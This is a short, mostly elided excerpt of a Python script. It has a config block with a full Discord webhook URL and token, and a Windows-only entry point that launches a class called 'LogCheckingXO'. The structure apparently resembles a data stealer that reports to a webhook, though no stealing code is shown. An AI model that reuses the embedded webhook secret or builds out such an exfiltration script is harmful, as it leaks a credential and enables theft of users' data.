...
__config__ = {
    ...
    'webhook': "https://discord.com/api/webhooks/1054523523705614356/gutXSGHpcGSGA1xwmaZHgFy7QmEv0crt0BbD-bXgw5KL1VaZFsjo-LAvXuXBJ8Fdsnze",
...
if __name__ == "__main__" and os.name == "nt":
    try:
        ...
        os._exit(0)
    asyncio.run(LogCheckingXO().init())